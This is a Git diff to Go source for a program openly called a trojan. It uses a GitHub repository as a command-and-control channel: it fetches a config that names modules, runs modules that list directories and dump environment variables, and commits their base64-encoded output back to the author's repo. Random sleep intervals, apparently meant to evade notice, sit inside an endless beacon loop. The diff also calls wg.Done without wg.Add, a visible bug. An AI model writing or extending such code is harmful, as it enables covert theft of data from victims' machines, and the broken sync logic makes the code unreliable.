@@ -6,7 +6,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"math/rand"
 	"os"
+	"sync"
+	"time"
 
 	"github.com/YarKhan02/Trojan/modules"
 	"github.com/google/go-github/v69/github"
@@ -36,26 +39,26 @@ func NewTrojan(id string) (*Trojan, error) {
 	}, nil
 }
 
-var moduleRegistry = map[string]func(args ...interface{}){
+var moduleRegistry = map[string]func(args ...interface{}) interface{}{
 	"dirlister":   modules.Dirlister,
 	"environment": modules.Environment,
 }
 
-func (t *Trojan) get_config() {
+func (t *Trojan) get_config() ([]map[string]interface{}, error) {
 	config_json, err := get_file_contents("config", t.config_file, t.client, t.ctx)
 	if err != nil {
-		return
+		return nil, fmt.Errorf("failed to get config: %v", err)
 	}
 
 	decoded_bytes, err := base64.StdEncoding.DecodeString(config_json)
 	if err != nil {
-		return 
+		return nil, fmt.Errorf("failed to decode config: %v", err)
 	}
 
 	var config []map[string]interface{}
 	err = json.Unmarshal(decoded_bytes, &config)
 	if err != nil {
-		return
+		return nil, fmt.Errorf("failed to unmarshal config: %v", err)
 	}
 
 	for _, task := range config {
@@ -66,6 +69,41 @@ func (t *Trojan) get_config() {
 				fmt.Println("Module not found:", moduleName)
 			}
 		}
+	}
+
+	return config, nil
+}
+
+func (t *Trojan) module_runner(module string) {
+	if moduleFunc, exists := moduleRegistry[module]; exists {
+		result := moduleFunc()
+		t.store_module_result(result)
+	} else {
+		fmt.Println("Module not found:", module)
+	}
+}
+
+func (t *Trojan) store_module_result(data interface{}) {
+	timestamp := time.Now().Format(time.RFC3339)
+	remote_path := fmt.Sprintf("data/%s/%s.data", t.id, timestamp)
+	data_str := fmt.Sprintf("%v", data)
+	bindata := []byte(data_str)
+	encoded_data := base64.StdEncoding.EncodeToString(bindata)
+
+	message := "Storing module result: "
+	fileContent := &github.RepositoryContentFileOptions{
+		Message: github.Ptr(message),
+		Content: []byte(encoded_data),
+	}
+
+	user := "YarKhan02"
+	repo := "Trojan"
+
+	_, _, err := t.client.Repositories.CreateFile(t.ctx, user, repo, remote_path, fileContent)
+	if err != nil {
+		fmt.Println("Error storing result:", err)
+	} else {
+		fmt.Println("Stored module result in:", remote_path)
 	}
 }
 
@@ -102,10 +140,43 @@ func get_file_contents(dirname string, module_name string, client *github.Client
 	return content, nil
 }
 
-func main() {
-	client, ctx, err := github_connect()
-	if err != nil {
-		log.Fatalf("Error connecting to GitHub: %v", err)
+func (t *Trojan) Run() {
+	for {
+		config, err := t.get_config()
+		if err != nil {
+			fmt.Println("Error getting config:", err)
+			continue
+		}
+
+		var wg sync.WaitGroup
+
+		for _, task := range config {
+			moduleName, ok := task["modules"].(string)
+			if !ok {
+				continue
+			}
+
+			go func(module string) {
+				defer wg.Done()
+				t.module_runner(module) // Pass module name to module_runner
+			} (moduleName)
+
+			// Sleep for a random interval (1-10 sec) before starting the next module
+			time.Sleep(time.Duration(rand.Intn(10)+1) * time.Second)
+		}
+
+		wg.Wait() // Wait for all goroutines to complete
+
+		// Sleep for a random interval (30 min - 3 hours)
+		time.Sleep(time.Duration(rand.Intn(3*60*60-30*60)+30*60) * time.Second)
 	}
-	get_file_contents("modules", "dirlister", client, ctx)
+}
+
+func main() {
+	trojan, err := NewTrojan("1")
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	trojan.Run()
 }
